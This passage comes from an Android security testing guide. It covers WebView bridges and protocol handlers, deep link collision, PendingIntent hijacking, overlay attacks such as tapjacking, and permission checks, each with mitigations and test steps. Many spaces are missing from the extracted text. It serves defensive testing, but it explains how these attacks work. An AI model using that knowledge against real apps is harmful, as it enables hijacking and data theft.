addJavascriptInterface method. This is known as a WebView JavaScript bridgeornativebridge. Please note that when you use addJavascriptInterface, you’re explicitly granting access to the registered JavaScript Interface object to all pages loaded within that WebView. This implies that, if the user navigates outside your app or domain, all other external pages will also have access to those JavaScript Interface objects which mightpresentapotentialsecurityriskifanysensitivedataisbeingexposedthoughthoseinterfaces. Warning: Take extreme care with apps targeting Android versions below Android 4.2 (API level 17) as they are vulnerabletoaflawintheimplementationofaddJavascriptInterface: anattackthatisabusingreflection,which leadstoremotecodeexecutionwhenmaliciousJavaScriptisinjectedintoaWebView. ThiswasduetoallJavaObject methodsbeingaccessiblebydefault(insteadofonlythoseannotated). 251\nWebViews Cleanup ClearingtheWebViewresourcesisacrucialstepwhenanappaccessesanysensitivedatawithinaWebView. Thisincludes anyfilesstoredlocally,theRAMcacheandanyloadedJavaScript. Asanadditionalmeasure,youcoulduseserver-sideheaderssuchasno-cache,whichpreventanapplicationfromcaching particularcontent. StartingonAndroid10(APIlevel29)appsareabletodetectifaWebViewhasbecomeunresponsive. Ifthishappens, theOSwillautomaticallycalltheonRenderProcessUnresponsivemethod. YoucanfindmoresecuritybestpracticeswhenusingWebViewsonAndroidDevelopers. Deep Links DeeplinksareURIsofanyschemethattakeusersdirectlytospecificcontentinanapp. Anappcansetupdeeplinksby addingintentfiltersontheAndroidManifestandextractingdatafromincomingintentstonavigateuserstothecorrect activity. Androidsupportstwotypesofdeeplinks: • CustomURLSchemes,whicharedeeplinksthatuseanycustomURLscheme,e.g.myapp://(notverifiedbythe OS). • AndroidAppLinks(Android6.0(APIlevel23)andhigher),whicharedeeplinksthatusethehttp://andhttps:// schemesandcontaintheautoVerifyattribute(whichtriggersOSverification). DeepLinkCollision: Usingunverifieddeeplinkscancauseasignificantissue-anyotherappsinstalledonauser’sdevicecandeclareandtry tohandlethesameintent,whichisknownasdeeplinkcollision. Anyarbitraryapplicationcandeclarecontroloverthe exactsamedeeplinkbelongingtoanotherapplication. InrecentversionsofAndroidthisresultsinaso-calleddisambiguationdialogshowntotheuserthatasksthemtoselect theapplicationthatshouldhandlethedeeplink. Theusercouldmakethemistakeofchoosingamaliciousapplication insteadofthelegitimateone. 252\nAndroidAppLinks: Inordertosolvethedeeplinkcollisionissue,Android6.0(APILevel23)introducedAndroidAppLinks,whichareverified deeplinksbasedonawebsiteURLexplicitlyregisteredbythedeveloper. ClickingonanAppLinkwillimmediatelyopen theappifit’sinstalled. Therearesomekeydifferencesfromunverifieddeeplinks: • AppLinksonlyusehttp://andhttps://schemes,anyothercustomURLschemesarenotallowed. • AppLinksrequirealivedomaintoserveaDigitalAssetLinksfileviaHTTPS. • AppLinksdonotsufferfromdeeplinkcollisionsincetheydon’tshowadisambiguationdialogwhenauseropens them. 253\nSensitive Functionality Exposure Through IPC Duringimplementationofamobileapplication,developersmayapplytraditionaltechniquesforIPC(suchasusingshared filesornetworksockets). TheIPCsystemfunctionalityofferedbymobileapplicationplatformsshouldbeusedbecauseitis muchmorematurethantraditionaltechniques. UsingIPCmechanismswithnosecurityinmindmaycausetheapplication toleakorexposesensitivedata. ThefollowingisalistofAndroidIPCMechanismsthatmayexposesensitivedata: • Binders • Services • BoundServices • AIDL • Intents • ContentProviders Pending Intents Oftenwhiledealingwithcomplexflowsduringappdevelopment,therearesituationswhereanappAwantsanotherapp B to perform a certain action in the future, on app A’s behalf. Trying to implement this by only usingIntents leads to varioussecurityproblems,likehavingmultipleexportedcomponents. Tohandlethisusecaseinasecuremanner,Android providesthePendingIntentAPI. PendingIntentaremostcommonlyusedfornotifications,appwidgets,mediabrowserservices,etc. Whenusedfornoti- fications,PendingIntentisusedtodeclareanintenttobeexecutedwhenauserperformsanactionwithanapplication’s notification. Thenotificationrequiresacallbacktotheapplicationtotriggeranactionwhentheuserclicksonit. Internally, aPendingIntentobjectwrapsanormalIntentobject(referredasbaseintent)thatwilleventuallybeused to invoke an action. For example, the base intent specifies that an activity A should be started in an application. The receivingapplicationofthePendingIntent,willunwrapandretrievethisbaseintentandinvoketheactivityAbycalling thePendingIntent.sendfunction. AtypicalimplementationforusingPendingIntentisbelow: Intentintent =newIntent(applicationContext,SomeActivity.class); //baseintent //createapendingintent PendingIntentpendingIntent =PendingIntent.getActivity(applicationContext,0,intent,PendingIntent.FLAG_IMMUTABLE); //sendthependingintenttoanotherapp IntentanotherIntent =newIntent(); anotherIntent.setClassName("other.app","other.app.MainActivity"); anotherIntent.putExtra("pendingIntent",pendingIntent); startActivity(anotherIntent); WhatmakesaPendingIntentsecureisthat,unlikeanormalIntent,itgrantspermissiontoaforeignapplicationtouse theIntent(thebaseintent)itcontains,asifitwerebeingexecutedbyyourapplication’sownprocess. Thisallowsan applicationtofreelyusethemtocreatecallbackswithouttheneedtocreateexportedactivities. Ifnotimplementedcorrectly,amaliciousapplicationcanhijackaPendingIntent. Forexample,inthenotificationexam- ple above, a malicious application with android.permission.BIND_NOTIFICATION_LISTENER_SERVICE can bind to the notificationlistenerserviceandretrievethependingintent. TherearecertainsecuritypitfallswhenimplementingPendingIntents,whicharelistedbelow: • Mutable fields: A PendingIntent can have mutable and empty fields that can be filled by a malicious applica- tion. Thiscanleadtoamaliciousapplicationgainingaccesstonon-exportedapplicationcomponents. Usingthe PendingIntent.FLAG_IMMUTABLEflagmakesthePendingIntentimmutableandpreventsanychangestothefields. PriortoAndroid12(APIlevel31),thePendingIntentwasmutablebydefault,whilesinceAndroid12(APIlevel31) itischangedtoimmutablebydefaulttopreventaccidentalvulnerabilities. • Use of implicit intent: A malicious application can receive a PendingIntent and then update the base intent totargetthecomponentandpackagewithinthemaliciousapplication. Asamitigation,ensurethatyouexplicitly specifytheexactpackage,actionandcomponentthatwillreceivethebaseintent. ThemostcommoncaseofPendingIntentattackiswhenamaliciousapplicationisabletointerceptit. Forfurtherdetails,checktheAndroiddocumentationonusingapendingintent. 254\nImplicit Intents An Intent is a messaging object that you can use to request an action from another application component. Although intentsfacilitatecommunicationbetweencomponentsinavarietyofways,therearethreebasicusecases: startingan activity,startingaservice,anddeliveringabroadcast. AccordingtotheAndroidDevelopersDocumentation,Androidprovidestwotypesofintents: • Explicitintentsspecifywhichapplicationwillsatisfytheintentbyprovidingeitherthetargetapp’spackagename orafullyqualifiedcomponentclassname. Typically,you’lluseanexplicitintenttostartacomponentinyourown app,becauseyouknowtheclassnameoftheactivityorserviceyouwanttostart. Forexample,youmightwantto startanewactivityinyourappinresponsetoauseraction,orstartaservicetodownloadafileinthebackground. //Note thespecificationofaconcretecomponent(DownloadActivity)thatisstartedbytheintent. IntentdownloadIntent =newIntent(this,DownloadActivity.class); downloadIntent.setAction("android.intent.action.GET_CONTENT") startActivityForResult(downloadIntent); • Implicit intents do not name a specific component, but instead declare a general action to be performed that anotherapp’scomponentcanhandle. Forexample,ifyouwanttoshowtheuseralocationonamap,youcanuse animplicitintenttoaskanothercapableapptoshowaspecificlocationonamap. Anotherexampleiswhenthe userclicksonanemailaddresswithinanapp,wherethecallingappdoesnotwanttospecifyaspecificemailapp andleavesthatchoiceuptotheuser. //Developers canalsostartanactivitybyjustsettinganactionthatismatchedbytheintendedapp. IntentdownloadIntent =newIntent(); downloadIntent.setAction("android.intent.action.GET_CONTENT") startActivityForResult(downloadIntent); Theuseofimplicitintentscanleadtomultiplesecurityrisks,e.g.ifthecallingappprocessesthereturnvalueoftheimplicit intent without proper verification or if the intent contains sensitive data, it can be accidentally leaked to unauthorized third-parties. You can refer to this blog post, this article and CWE-927 for more information about the mentioned problem, concrete attackscenariosandrecommendations. Object Persistence ThereareseveralwaystopersistanobjectonAndroid: Object Serialization Anobjectanditsdatacanberepresentedasasequenceofbytes. ThisisdoneinJavaviaobjectserialization. Serialization isnotinherentlysecure. Itisjustabinaryformat(orrepresentation)forlocallystoringdataina.serfile. Encryptingand signing HMAC-serialized data is possible as long as the keys are stored safely. Deserializing an object requires a class ofthesameversionastheclassusedtoserializetheobject. Afterclasseshavebeenchanged,theObjectInputStream can’tcreateobjectsfromolder.serfiles. TheexamplebelowshowshowtocreateaSerializableclassbyimplementing theSerializableinterface. import java.io.Serializable; public class Person implements Serializable { private StringfirstName; private StringlastName; public Person(StringfirstName,StringlastName){ this.firstName =firstName; this.lastName =lastName; } //.. //getters,setters,etc //.. } Nowyoucanread/writetheobjectwithObjectInputStream/ObjectOutputStreaminanotherclass. 255\nJSON ThereareseveralwaystoserializethecontentsofanobjecttoJSON.AndroidcomeswiththeJSONObjectandJSONArray classes. Awidevarietyoflibraries,includingGSON,Jackson,Moshi,canalsobeused. Themaindifferencesbetweenthe librariesarewhethertheyusereflectiontocomposetheobject, whethertheysupportannotations, whetherthecreate immutableobjects,andtheamountofmemorytheyuse. NotethatalmostalltheJSONrepresentationsareString-based andthereforeimmutable. ThismeansthatanysecretstoredinJSONwillbehardertoremovefrommemory. JSONitself can be stored anywhere, e.g., a (NoSQL) database or a file. You just need to make sure that any JSON that contains secretshasbeenappropriatelyprotected(e.g.,encrypted/HMACed). Seethechapter“DataStorageonAndroid”formore details. Asimpleexample(fromtheGSONUserGuide)ofwritingandreadingJSONwithGSONfollows. Inthisexample, thecontentsofaninstanceoftheBagOfPrimitivesisserializedintoJSON: class BagOfPrimitives { private intvalue1 =1; private Stringvalue2 ="abc"; private transient intvalue3 =3; BagOfPrimitives(){ //no-argsconstructor } } //Serialization BagOfPrimitivesobj =newBagOfPrimitives(); Gsongson =newGson(); Stringjson =gson.toJson(obj); //==>jsonis{"value1":1,"value2":"abc"} XML ThereareseveralwaystoserializethecontentsofanobjecttoXMLandback. AndroidcomeswiththeXmlPullParser interfacewhichallowsforeasilymaintainableXMLparsing. TherearetwoimplementationswithinAndroid: KXmlParser and ExpatPullParser. The Android Developer Guide provides a great write-up on how to use them. Next, there are variousalternatives,suchasaSAXparserthatcomeswiththeJavaruntime. Formoreinformation,seeablogpostfrom ibm.com. SimilarlytoJSON,XMLhastheissueofworkingmostlyStringbased,whichmeansthatString-typesecretswill behardertoremovefrommemory. XMLdatacanbestoredanywhere(database,files),butdoneedadditionalprotection incaseofsecretsorinformationthatshouldnotbechanged. Seethechapter“DataStorageonAndroid”formoredetails. Asstatedearlier: thetruedangerinXMLliesintheXMLeXternalEntity(XXE)attackasitmightallowforreadingexternal datasourcesthatarestillaccessiblewithintheapplication. ORM Therearelibrariesthatprovidefunctionalityfordirectlystoringthecontentsofanobjectinadatabaseandtheninstanti- atingtheobjectwiththedatabasecontents. ThisiscalledObject-RelationalMapping(ORM).LibrariesthatusetheSQLite databaseinclude • OrmLite, • SugarORM, • GreenDAOand • ActiveAndroid. Realm,ontheotherhand,usesitsowndatabasetostorethecontentsofaclass. TheamountofprotectionthatORMcan providedependsprimarilyonwhetherthedatabaseisencrypted. Seethechapter“DataStorageonAndroid”formore details. TheRealmwebsiteincludesaniceexampleofORMLite. Parcelable ParcelableisaninterfaceforclasseswhoseinstancescanbewrittentoandrestoredfromaParcel. Parcelsareoften used to pack a class as part of a Bundle for an Intent. Here’s an Android developer documentation example that implementsParcelable: public class MyParcelable implements Parcelable { private intmData; public intdescribeContents(){ 256\nreturn 0; } public void writeToParcel(Parcelout,intflags){ out.writeInt(mData); } public static final Parcelable.Creator<MyParcelable>CREATOR =newParcelable.Creator<MyParcelable>(){ public MyParcelable createFromParcel(Parcelin){ return newMyParcelable(in); } public MyParcelable[]newArray(intsize){ return newMyParcelable[size]; } }; private MyParcelable(Parcelin){ mData =in.readInt(); } } Because this mechanism that involves Parcels and Intents may change over time, and the Parcelable may contain IBinderpointers,storingdatatodiskviaParcelableisnotrecommended. Protocol Buffers ProtocolBuffersbyGoogle,areaplatform-andlanguageneutralmechanismforserializingstructureddatabymeansof theBinaryDataFormat. TherehavebeenafewvulnerabilitieswithProtocolBuffers,suchasCVE-2015-5237. Notethat ProtocolBuffersdonotprovideanyprotectionforconfidentiality: thereisnobuiltinencryption. Overlay Attacks Screen overlay attacks occur when a malicious application manages to put itself on top of another application which remainsworkingnormallyasifitwereontheforeground. ThemaliciousappmightcreateUIelementsmimickingthelook and feel and the original app or even the Android system UI. The intention is typically to make users believe that they keep interacting with the legitimate app and then try to elevate privileges (e.g by getting some permissions granted), stealthyphishing,captureusertapsandkeystrokesetc. ThereareseveralattacksaffectingdifferentAndroidversionsincluding: • Tapjacking(Android6.0(APIlevel23)andlower)abusesthescreenoverlayfeatureofAndroidlisteningfortaps andinterceptinganyinformationbeingpassedtotheunderlyingactivity. • Cloak&DaggerattacksaffectappstargetingAndroid5.0(APIlevel21)toAndroid7.1(APIlevel25). Theyabuse oneorbothoftheSYSTEM_ALERT_WINDOW(“drawontop”)andBIND_ACCESSIBILITY_SERVICE(“a11y”)permissions that,incasetheappisinstalledfromthePlayStore,theusersdonotneedtoexplicitlygrantandforwhichthey arenotevennotified. • ToastOverlayisquitesimilartoCloak&DaggerbutdonotrequirespecificAndroidpermissionstobegrantedby users. ItwasclosedwithCVE-2017-0752onAndroid8.0(APIlevel26). Usually,thiskindofattacksareinherenttoanAndroidsystemversionhavingcertainvulnerabilitiesordesignissues. This makes them challenging and often virtually impossible to prevent unless the app is upgraded targeting a safe Android version(APIlevel). OvertheyearsmanyknownmalwarelikeMazorBot,BankBotorMysteryBothavebeenabusingthescreenoverlayfeature ofAndroidtotargetbusinesscriticalapplications,namelyinthebankingsector. Thisblogdiscussesmoreaboutthistype ofmalware. Enforced Updating Starting from Android 5.0 (API level 21), together with the Play Core Library, apps can be forced to be updated. This mechanismisbasedonusingtheAppUpdateManager. Beforethat,othermechanismswereused,suchasdoinghttpcalls to the Google Play Store, which are not as reliable as the APIs of the Play Store might change. Alternatively, Firebase couldbeusedtocheckforpossibleforcedupdatesaswell(seethisblog). Enforcedupdatingcanbereallyhelpfulwhen 257\nitcomestopublickeypinning(seetheTestingNetworkcommunicationformoredetails)whenapinhastoberefreshed duetoacertificate/publickeyrotation. Next,vulnerabilitiesareeasilypatchedbymeansofforcedupdates. Please note that newer versions of an application will not fix security issues that are living in the backends to which the app communicates. Allowing an app not to communicate with it might not be enough. Having proper API-lifecycle managementiskeyhere. Similarly,whenauserisnotforcedtoupdate,donotforgettotestolderversionsofyourapp againstyourAPIand/oruseproperAPIversioning. Testing WebView Protocol Handlers Platform: android MASVSV1: MSTG-PLATFORM-6 MASVSV2: MASVS-PLATFORM-2 Overview TotestforWebViewprotocolhandlerschecktheappforWebViewusageandevaluatewhetherornottheWebViewshould haveresourceaccess. Ifresourceaccessisnecessaryyouneedtoverifythatit’simplementedfollowingbestpractices. Static Analysis CheckthesourcecodeforWebViewusage. ThefollowingWebViewsettingscontrolresourceaccess: • setAllowContentAccess: ContentURLaccessallowsWebViewstoloadcontentfromacontentproviderinstalled onthesystem,whichisenabledbydefault. • setAllowFileAccess: EnablesanddisablesfileaccesswithinaWebView. Thedefaultvalueistruewhentargeting Android10(APIlevel29)andbelowandfalseforAndroid11(APIlevel30)andabove. Notethatthisenablesand disablesfilesystemaccessonly. Assetandresourceaccessisunaffectedandaccessibleviafile:///android_- assetandfile:///android_res. • setAllowFileAccessFromFileURLs: DoesordoesnotallowJavaScriptrunninginthecontextofafileschemeURL toaccesscontentfromotherfileschemeURLs. ThedefaultvalueistrueforAndroid4.0.3-4.0.4(APIlevel15)and belowandfalseforAndroid4.1(APIlevel16)andabove. • setAllowUniversalAccessFromFileURLs: DoesordoesnotallowJavaScriptrunninginthecontextofafilescheme URLtoaccesscontentfromanyorigin. ThedefaultvalueistrueforAndroid4.0.3-4.0.4(APIlevel15)andbelow andfalseforAndroid4.1(APIlevel16)andabove. Ifoneormoreoftheabovemethodsis/areactivated,youshoulddeterminewhetherthemethod(s)is/arereallynecessary fortheapptoworkproperly. IfaWebViewinstancecanbeidentified,findoutwhetherlocalfilesareloadedwiththeloadURLmethod. WebView =newWebView(this); webView.loadUrl("file:///android_asset/filename.html"); ThelocationfromwhichtheHTMLfileisloadedmustbeverified. Ifthefileisloadedfromexternalstorage,forexample, thefileisreadableandwritablebyeveryone. Thisisconsideredabadpractice. Instead,thefileshouldbeplacedinthe app’sassetsdirectory. webview.loadUrl("file:///" + Environment.getExternalStorageDirectory().getPath()+ "filename.html"); The URL specified in loadURL should be checked for dynamic parameters that can be manipulated; their manipulation mayleadtolocalfileinclusion. Usethefollowingcodesnippetandbestpracticestodeactivateprotocolhandlers,ifapplicable: 258\n//IfattackerscaninjectscriptintoaWebView,theycouldaccesslocalresources.Thiscanbepreventedbydisablinglocalfilesystemaccess,whichisenabled ↪ bydefault.YoucanusetheAndroidWebSettingsclasstodisablelocalfilesystemaccessviathepublicmethod`setAllowFileAccess`. webView.getSettings().setAllowFileAccess(false); webView.getSettings().setAllowFileAccessFromFileURLs(false); webView.getSettings().setAllowUniversalAccessFromFileURLs(false); webView.getSettings().setAllowContentAccess(false); • Createalistthatdefineslocalandremotewebpagesandprotocolsthatareallowedtobeloaded. • CreatechecksumsofthelocalHTML/JavaScriptfilesandcheckthemwhiletheappisstartingup. MinifyJavaScript filestomakethemhardertoread. Dynamic Analysis Toidentifytheusageofprotocolhandlers,lookforwaystotriggerphonecallsandwaystoaccessfilesfromthefilesystem whileyou’reusingtheapp. Testing for Overlay Attacks Platform: android MASVSV1: MSTG-PLATFORM-9 MASVSV2: MASVS-PLATFORM-3 Overview To test for overlay attacks you need to check the app for usage of certain APIs and attributed typically used to protect againstoverlayattacksaswellaschecktheAndroidversionthatappistargeting. TomitigatetheseattackspleasecarefullyreadthegeneralguidelinesaboutAndroidViewsecurityintheAndroidDeveloper Documentation. Forinstance,theso-calledtouchfilteringisacommondefenseagainsttapjacking,whichcontributesto safeguardingusersagainstthesevulnerabilities,usuallyincombinationwithothertechniquesandconsiderationsaswe introduceinthissection. Static Analysis Tostartyourstaticanalysisyoucanchecktheappforthefollowingmethodsandattributes(non-exhaustivelist): • OverrideonFilterTouchEventForSecurityformorefine-grainedcontrolandtoimplementacustomsecuritypolicy forviews. • Setthelayoutattributeandroid:filterTouchesWhenObscuredtotrueorcallsetFilterTouchesWhenObscured. • Check FLAG_WINDOW_IS_OBSCURED (since API level 9) or FLAG_WINDOW_IS_PARTIALLY_OBSCURED (starting on APIlevel29). Someattributesmightaffecttheappasawhole,whileotherscanbeappliedtospecificcomponents. Thelatterwould bethecasewhen,forexample,thereisabusinessneedtospecificallyallowoverlayswhilewantingtoprotectsensitive inputUIelements. Thedevelopersmightalsotakeadditionalprecautionstoconfirmtheuser’sactualintentwhichmight belegitimateandtellitapartfromapotentialattack. Asafinalnote,alwaysremembertoproperlychecktheAPIlevelthatappistargetingandtheimplicationsthatthishas. Forinstance,Android8.0(APIlevel26)introducedchangestoappsrequiringSYSTEM_ALERT_WINDOW(“drawontop”). From thisAPIlevelon,appsusingTYPE_APPLICATION_OVERLAYwillbealwaysshownaboveotherwindowshavingothertypes such as TYPE_SYSTEM_OVERLAY or TYPE_SYSTEM_ALERT. You can use this information to ensure that no overlay attacks mayoccuratleastforthisappinthisconcreteAndroidversion. 259\nDynamic Analysis Abusingthiskindofvulnerabilityonadynamicmannercanbeprettychallengingandveryspecializedasitcloselydepends onthetargetAndroidversion. Forinstance,forversionsuptoAndroid7.0(APIlevel24)youcanusethefollowingAPKs asaproofofconcepttoidentifytheexistenceofthevulnerabilities. • TapjackingPOC:ThisAPKcreatesasimpleoverlaywhichsitsontopofthetestingapplication. • Invisible Keyboard: This APK creates multiple overlays on the keyboard to capture keystrokes. This is one of the exploitdemonstratedinCloakandDaggerattacks. Testing WebViews Cleanup Platform: android MASVSV1: MSTG-PLATFORM-10 MASVSV2: MASVS-PLATFORM-2 Overview TotestforWebViewscleanupyoushouldinspectallAPIsrelatedtoWebViewdatadeletionandtrytofullytrackthedata deletionprocess. Static Analysis StartbyidentifyingtheusageofthefollowingWebViewAPIsandcarefullyvalidatethementionedbestpractices. • Initialization: an app might be initializing the WebView in a way to avoid storing certain information by using setDomStorageEnabled,setAppCacheEnabledorsetDatabaseEnabledfromandroid.webkit.WebSettings. The DOMStorage(forusingtheHTML5localstorage),ApplicationCachesandDatabaseStorageAPIsaredisabledby default,butappsmightsetthesesettingsexplicitlyto“true”. • Cache: Android’sWebViewclassofferstheclearCachemethodwhichcanbeusedtoclearthecacheforallWe- bViews used by the app. It receives a boolean input parameter (includeDiskFiles) which will wipe all stored resource including the RAM cache. However if it’s set to false, it will only clear the RAM cache. Check the app for usage of the clearCache method and verify its input parameter. Additionally, you may also check if the app isoverridingonRenderProcessUnresponsiveforthecasewhentheWebViewmightbecomeunresponsive,asthe clearCachemethodmightalsobecalledfromthere. • WebStorageAPIs: WebStorage.deleteAllDatacanbealsousedtoclearallstoragecurrentlybeingusedbythe JavaScriptstorageAPIs,includingtheWebSQLDatabaseandtheHTML5WebStorageAPIs. >Someappswillneed toenabletheDOMstorageinordertodisplaysomeHTML5sitesthatuselocalstorage. Thisshouldbecarefully investigatedasthismightcontainsensitivedata. • Cookies: anyexistingcookiescanbedeletedbyusingCookieManager.removeAllCookies. • FileAPIs: properdatadeletionincertaindirectoriesmightnotbethatstraightforward,someappsuseapragmatic solution which is to manually delete selected directories known to hold user data. This can be done using the java.io.FileAPIsuchasjava.io.File.deleteRecursively. Example: ThisexampleinKotlinfromtheopensourceFirefoxFocusappshowsdifferentcleanupsteps: overridefun cleanup(){ clearFormData()//Removestheautocompletepopupfromthecurrentlyfocusedformfield,ifpresent.Notethisonlyaffectsthedisplayof theautocomplete ↪ popup,itdoesnotremoveanysavedformdatafromthisWebView'sstore.Todothat,useWebViewDatabase#clearFormData. clearHistory() clearMatches() clearSslPreferences() clearCache(true) CookieManager.getInstance().removeAllCookies(null) 260\nWebStorage.getInstance().deleteAllData()//ClearsallstoragecurrentlybeingusedbytheJavaScriptstorageAPIs.ThisincludestheApplicationCache,Web ↪ SQLDatabaseandtheHTML5WebStorageAPIs. valwebViewDatabase =WebViewDatabase.getInstance(context) //Itisn'tentirelyclearhowthisdiffersfromWebView.clearFormData() @Suppress("DEPRECATION") webViewDatabase.clearFormData()//Clearsanysaveddataforwebforms. webViewDatabase.clearHttpAuthUsernamePassword() deleteContentFromKnownLocations(context)//callsFileUtils.deleteWebViewDirectory(context)whichdeletesallcontentin"app_webview". } ThefunctionfinisheswithsomeextramanualfiledeletionindeleteContentFromKnownLocationswhichcallsfunctions fromFileUtils. Thesefunctionsusethejava.io.File.deleteRecursivelymethodtorecursivelydeletefilesfromthe specifieddirectories. private fundeleteContent(directory:File,doNotEraseWhitelist:Set<String>= emptySet()): Boolean { valfilesToDelete =directory.listFiles()?.filter {!doNotEraseWhitelist.contains(it.name)}?:return false return filesToDelete.all{it.deleteRecursively()} } Dynamic Analysis OpenaWebViewaccessingsensitivedataandthenlogoutoftheapplication. Accesstheapplication’sstoragecontainer andmakesureallWebViewrelatedfilesaredeleted. ThefollowingfilesandfoldersaretypicallyrelatedtoWebViews: • app_webview • Cookies • pref_store • blob_storage • SessionStorage • WebData • ServiceWorker Testing for App Permissions Platform: android MASVSV1: MSTG-PLATFORM-1 MASVSV2: MASVS-PLATFORM-1 Overview Whentestingapppermissionsthegoalistotryandreducetheamountofpermissionsusedbyyourapptotheabsolute minimum. Whilegoingthrougheachpermission,rememberthatitisbestpracticefirsttotryandevaluatewhetheryour appneedstousethispermissionbecausemanyfunctionalitiessuchastakingaphotocanbedonewithout,limitingthe amount of access to sensitive data. If permissions are required you will then make sure that the request/response to accessthepermissionishandledhandledcorrectly. Static Analysis Android Permissions Check permissions to make sure that the app really needs them and remove unnecessary permissions. For example, theINTERNETpermissionintheAndroidManifest.xmlfileisnecessaryforanActivitytoloadawebpageintoaWebView. Becauseausercanrevokeanapplication’srighttouseadangerouspermission,thedevelopershouldcheckwhetherthe applicationhastheappropriatepermissioneachtimeanactionisperformedthatwouldrequirethatpermission. 261\n<uses-permission android:name="android.permission.INTERNET" /> Gothroughthepermissionswiththedevelopertoidentifythepurposeofeverypermissionsetandremoveunnecessary permissions. BesidesgoingthroughtheAndroidManifest.xmlfilemanually, youcanalsousetheAndroidAssetPackagingtool(aapt) toexaminethepermissionsofanAPKfile. aaptcomeswiththeAndroidSDKwithinthebuild-toolsfolder. ItrequiresanAPKfileasinput. YoumaylisttheAPKs inthedevicebyrunningadb shell pm list packages -f | grep -i <keyword>asseenin“ListingInstalledApps”. $aaptdpermissionsapp-x86-debug.apk package:sg.vp.owasp_mobile.omtg_android uses-permission:name='android.permission.WRITE_EXTERNAL_STORAGE' uses-permission:name='android.permission.INTERNET' Alternativelyyoumayobtainamoredetailedlistofpermissionsviaadbandthedumpsystool: $adbshelldumpsyspackagesg.vp.owasp_mobile.omtg_android |grep permission requestedpermissions: android.permission.WRITE_EXTERNAL_STORAGE android.permission.INTERNET android.permission.READ_EXTERNAL_STORAGE install permissions: android.permission.INTERNET:granted=true runtimepermissions: Pleasereferencethispermissionsoverviewfordescriptionsofthelistedpermissionsthatareconsidereddangerous. READ_CALENDAR WRITE_CALENDAR READ_CALL_LOG WRITE_CALL_LOG PROCESS_OUTGOING_CALLS CAMERA READ_CONTACTS WRITE_CONTACTS GET_ACCOUNTS ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION RECORD_AUDIO READ_PHONE_STATE READ_PHONE_NUMBERS CALL_PHONE ANSWER_PHONE_CALLS ADD_VOICEMAIL USE_SIP BODY_SENSORS SEND_SMS RECEIVE_SMS READ_SMS RECEIVE_WAP_PUSH RECEIVE_MMS READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE Custom Permissions Apartfromenforcingcustompermissionsviatheapplicationmanifestfile,youcanalsocheckpermissionsprogrammat- ically. This is not recommended, however, because it is more error-prone and can be bypassed more easily with, e.g., runtimeinstrumentation. ItisrecommendedthattheContextCompat.checkSelfPermissionmethodiscalledtocheck if an activity has a specified permission. Whenever you see code like the following snippet, make sure that the same permissionsareenforcedinthemanifestfile. private static final StringTAG ="LOG"; intcanProcess =checkCallingOrSelfPermission("com.example.perm.READ_INCOMING_MSG"); if(canProcess !=PERMISSION_GRANTED) throw newSecurityException(); OrwithContextCompat.checkSelfPermissionwhichcomparesittothemanifestfile. 262\nif(ContextCompat.checkSelfPermission(secureActivity.this,Manifest.READ_INCOMING_MSG) !=PackageManager.PERMISSION_GRANTED){ //!=standsfornotequalsPERMISSION_GRANTED Log.v(TAG,"Permissiondenied"); } Requesting Permissions Ifyourapplicationhaspermissionsthatneedtoberequestedatruntime,theapplicationmustcalltherequestPermis- sionsmethodinordertoobtainthem. Theapppassesthepermissionsneededandanintegerrequestcodeyouhave specifiedtotheuserasynchronously,returningoncetheuserchoosestoacceptordenytherequestinthesamethread. Aftertheresponseisreturnedthesamerequestcodeispassedtotheapp’scallbackmethod. private static final StringTAG ="LOG"; //WestartbycheckingthepermissionofthecurrentActivity if(ContextCompat.checkSelfPermission(secureActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) !=PackageManager.PERMISSION_GRANTED){ //Permissionisnotgranted //Shouldweshowanexplanation? if(ActivityCompat.shouldShowRequestPermissionRationale(secureActivity.this, //GetswhetheryoushouldshowUIwithrationaleforrequestingpermission. //Youshoulddothisonlyifyoudonothavepermissionandthepermissionrequestedrationaleisnotcommunicatedclearly totheuser. Manifest.permission.WRITE_EXTERNAL_STORAGE)){ //Asynchronousthreadwaitsfortheusersresponse. //Aftertheuserseestheexplanationtryrequestingthepermissionagain. }else { //Requestapermissionthatdoesn'tneedtobeexplained. ActivityCompat.requestPermissions(secureActivity.this, newString[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE); //MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGEwillbetheapp-definedintconstant. //Thecallbackmethodgetstheresultoftherequest. } }else { //Permissionalreadygranteddebugmessageprintedinterminal. Log.v(TAG,"Permissionalreadygranted."); } Pleasenotethatifyouneedtoprovideanyinformationorexplanationtotheuseritneedstobedonebeforethecallto requestPermissions,sincethesystemdialogboxcannotbealteredoncecalled. Handling Responses to Permission Requests NowyourapphastooverridethesystemmethodonRequestPermissionsResulttoseeifthepermissionwasgranted. ThismethodreceivestherequestCodeintegerasinputparameter(whichisthesamerequestcodethatwascreatedin requestPermissions). ThefollowingcallbackmethodmaybeusedforWRITE_EXTERNAL_STORAGE. @Override //NeededtooverridesystemmethodonRequestPermissionsResult() public void onRequestPermissionsResult(intrequestCode,//requestCodeiswhatyouspecifiedinrequestPermissions() Stringpermissions[],int[]permissionResults){ switch (requestCode){ case MY_PERMISSIONS_WRITE_EXTERNAL_STORAGE:{ if(grantResults.length >0 && permissionResults[0]==PackageManager.PERMISSION_GRANTED){ //0isacanceledrequest,ifintarrayequalsrequestCodepermissionisgranted. }else { //permissiondeniedcodegoeshere. Log.v(TAG,"Permissiondenied"); } return; } //Otherswitchcasescanbeaddedhereformultiplepermissionchecks. } } Permissionsshouldbeexplicitlyrequestedforeveryneededpermission,evenifasimilarpermissionfromthesamegroup has already been requested. For applications targeting Android 7.1 (API level 25) and older, Android will automatically giveanapplicationallthepermissionsfromapermissiongroup, iftheusergrantsoneoftherequestedpermissionsof thatgroup. StartingwithAndroid8.0(APIlevel26),permissionswillstillautomaticallybegrantedifauserhasalready 263\ngrantedapermissionfromthesamepermissiongroup,buttheapplicationstillneedstoexplicitlyrequestthepermission. Inthiscase,theonRequestPermissionsResulthandlerwillautomaticallybetriggeredwithoutanyuserinteraction. ForexampleifbothREAD_EXTERNAL_STORAGEandWRITE_EXTERNAL_STORAGEarelistedintheAndroidManifestbutonly permissionsaregrantedforREAD_EXTERNAL_STORAGE,thenrequestingWRITE_EXTERNAL_STORAGEwillautomaticallyhave permissionswithoutuserinteractionbecausetheyareinthesamegroupandnotexplicitlyrequested. Permission Analysis 